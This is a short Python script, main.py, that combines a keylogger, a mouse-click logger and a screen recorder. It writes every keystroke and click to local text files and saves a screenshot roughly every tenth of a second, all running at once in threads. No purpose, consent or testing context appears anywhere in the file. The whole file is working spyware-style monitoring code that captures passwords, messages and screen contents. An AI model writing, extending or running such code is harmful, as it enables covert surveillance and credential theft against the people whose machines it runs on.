# main.py
import os
import subprocess
import threading
import os
import time
import platform
import pyautogui
from pynput import keyboard
from pynput import mouse


def on_press(key):
    with open("key_strokes.txt", "a") as f:
        f.write(f"{key}\n")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
    
def on_click(x, y, button, pressed):
    with open("mouse_clicks.txt", "a") as f:
        action = "Pressed" if pressed else "Released"
        f.write(f"{action} mouse button {button} at ({x}, {y})\n")

def start_mouse_logger():
    listener = mouse.Listener(on_click=on_click)
    listener.start()
    listener.join()

def record_screen():
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')

    while True:
        screenshot_path = os.path.join('screenshots', f'screenshot_{time.time()}.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        time.sleep(0.1)
        
if __name__ == "__main__":
    # Start keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Start mouse logger in a separate thread
    mouse_logger_thread = threading.Thread(target=start_mouse_logger)
    mouse_logger_thread.start()

    # Start screen recorder in the main thread
    record_screen()

    # Wait for the keylogger and mouse logger threads to finish
    keylogger_thread.join()
    mouse_logger_thread.join()

    
